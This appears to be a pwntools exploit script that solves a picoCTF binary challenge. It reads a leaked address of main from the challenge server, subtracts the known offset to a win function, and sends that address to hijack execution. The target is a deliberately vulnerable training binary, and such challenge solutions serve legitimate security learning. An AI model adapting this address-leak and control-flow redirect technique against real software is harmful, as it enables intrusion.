from pwn import *

context.binary = elf = ELF("./vuln", checksec=False)
#io = elf.process()
io = remote("rescued-float.picoctf.net", 64485)
context.log_level = "debug"

main_fun = 0x0010133d
win_fun = 0x001012a7
diff = main_fun - win_fun

io.recvuntil(b"0x")
main_leak = io.recvline().strip()
main_leak = int(main_leak, 16)
log.info(f"Leaked main address: {hex(main_leak)}")

payload = hex(main_leak - diff).encode()
io.sendlineafter(b": ", payload)

io.interactive()